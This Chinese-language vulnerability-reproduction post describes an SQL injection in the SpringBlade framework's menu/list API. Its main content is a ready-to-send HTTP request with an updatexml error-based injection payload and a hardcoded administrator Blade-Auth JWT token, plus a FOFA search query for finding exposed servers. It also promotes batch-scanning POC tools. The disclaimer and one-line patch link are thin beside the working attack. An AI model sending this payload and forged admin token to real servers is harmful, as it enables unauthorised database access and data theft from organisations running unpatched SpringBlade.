#  SpringBlade api/blade-system/menu/list接口存在SQL注入漏洞 附POC   
2025-5-21更新  南风漏洞复现文库   2025-05-21 15:10  
  
   
  
  
免责声明：请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息或者工具而造成的任何直接或者间接的后果及损失，均由使用者本人负责，所产生的一切不良后果与文章作者无关。该文章仅供学习用途使用。  
## 1. SpringBlade 简介  
  
微信公众号搜索：南风漏洞复现文库  
该文章 南风漏洞复现文库 公众号首发  
  
SpringBlade 是一个由商业级项目升级优化而来的微服务架构 采用Spring Boot 2.5 、Spring Cloud 2020 等核心技术构建，完全遵循阿里巴巴编码规范。  
## 2.漏洞描述  
  
SpringBlade 是一个由商业级项目升级优化而来的微服务架构 采用Spring Boot 2.7 、Spring Cloud 2021 等核心技术构建 ，完全遵循阿里巴巴编码规范。提供基于React和Vue的两个前端框架用于快速搭建企业级的SaaS多租户微服务平台。api/blade-system/menu/list接口存在SQL注入漏洞  
  
CVE编号:  
  
CNNVD编号:  
  
CNVD编号:  
## 3.影响版本  
  
SpringBlade  
![SpringBlade api/blade-system/menu/list接口存在SQL注入漏洞](https://mmbiz.qpic.cn/sz_mmbiz_png/HsJDm7fvc3ZXzKr8ZnfDq0Dib5jUwgnicDo5ib8cyJ1xt7x60Sbs9w17cLusViaibPkvUnFgBk07IDEADia3xFlg8htw/640?wx_fmt=png&from=appmsg "null")  
  
SpringBlade api/blade-system/menu/list接口存在SQL注入漏洞  
## 4.fofa查询语句  
  
body="https://bladex.vip"  
## 5.漏洞复现  
  
漏洞链接：https://xx.xx.xx.xx/api/blade-system/menu/list?updatexml(1,concat(0x7e,md5(1),0x7e),1)=1  
  
漏洞数据包：  
```
GET /api/blade-system/menu/list?updatexml(1,concat(0x7e,md5(1),0x7e),1)=1 HTTP/1.1
Host: xx.xx.xx.xx
User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)
Accept: */*
Connection: Keep-Alive
Blade-Auth: bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0ZW5hbnRfaWQiOiIwMDAwMDAiLCJ1c2VyX25hbWUiOiJhZG1pbiIsInJlYWxfbmFtZSI6IueuoeeQhuWRmCIsImF1dGhvcml0aWVzIjpbImFkbWluaXN0cmF0b3IiXSwiY2xpZW50X2lkIjoic2FiZXIiLCJyb2xlX25hbWUiOiJhZG1pbmlzdHJhdG9yIiwibGljZW5zZSI6InBvd2VyZWQgYnkgYmxhZGV4IiwicG9zdF9pZCI6IjExMjM1OTg4MTc3Mzg2NzUyMDEiLCJ1c2VyX2lkIjoiMTEyMzU5ODgyMTczODY3NTIwMSIsInJvbGVfaWQiOiIxMTIzNTk4ODE2NzM4Njc1MjAxIiwic2NvcGUiOlsiYWxsIl0sIm5pY2tfbmFtZSI6IueuoeeQhuWRmCIsIm9hdXRoX2lkIjoiIiwiZGV0YWlsIjp7InR5cGUiOiJ3ZWIifSwiYWNjb3VudCI6ImFkbWluIn0.RtS67Tmbo7yFKHyMz_bMQW7dfgNjxZW47KtnFcwItxQ  
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3ZXzKr8ZnfDq0Dib5jUwgnicD1lNJjVk4xmXMA7fS7k4UAJ4vbyokictdhib70ewSx8hU8jJ53xic2iacVA/640?wx_fmt=jpeg&from=appmsg "null")  
  
  
执行user()函数  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3ZXzKr8ZnfDq0Dib5jUwgnicDGsD9OXwv6P6jLkkZE0ic8uCOWia431lCk31218du5ibNIUweMZ0btgmVg/640?wx_fmt=jpeg&from=appmsg "null")  
  
## 6.POC&EXP  
  
关注公众号 南风漏洞复现文库 并回复 漏洞复现10 即可获得该POC工具下载地址：  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3ZXzKr8ZnfDq0Dib5jUwgnicDvuNrGDcttfIuLESqZuprQLia68BVUGJzlVWpEo5VYPc9BadYtfqgy5A/640?wx_fmt=jpeg&from=appmsg "null")  
  
  
本期漏洞及往期漏洞的批量扫描POC及POC工具箱已经上传知识星球：南风网络安全  
1: 更新poc批量扫描软件，承诺，一周更新8-14个插件吧，我会优先写使用量比较大程序漏洞。  
2: 免登录，免费fofa查询。  
3: 更新其他实用网络安全工具项目。  
4: 免费指纹识别，持续更新指纹库。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3ZXzKr8ZnfDq0Dib5jUwgnicD8xZVwnE0l81NjFkjNgB1a3icpUDqRZ5RZHkNGkjdUrWms3jticYRIMjg/640?wx_fmt=jpeg&from=appmsg "null")  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3ZXzKr8ZnfDq0Dib5jUwgnicDBJLe5AkhiaDNMspICGMQlcdVjm5KEKVvgpS2oFIn6tAF7icFqW9mNXgw/640?wx_fmt=jpeg&from=appmsg "null")  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3ZXzKr8ZnfDq0Dib5jUwgnicDT6HamRyzOZiack5GO1VgVon15hREfe0IeRoicqliaIibN8CQI1TjicztSAQ/640?wx_fmt=jpeg&from=appmsg "null")  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3ZXzKr8ZnfDq0Dib5jUwgnicD4iblS21HEYD5DrRQicD5Yty6hqxaKCyzN9WUGb6yPhrmkUTXHgKfaIaQ/640?wx_fmt=jpeg&from=appmsg "null")  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3ZXzKr8ZnfDq0Dib5jUwgnicDtn5ZANIWfzWrgUjK1jUFFnJOC1ruO9SjbklP7593iaF5hAicYF7J7GmQ/640?wx_fmt=jpeg&from=appmsg "null")  
  
## 7.整改意见  
  
⼚商已发布了漏洞修复程序 请及时关注更新：https://github.com/chillzhuang/blade-tool  
## 8.往期回顾  
  
  
   
  
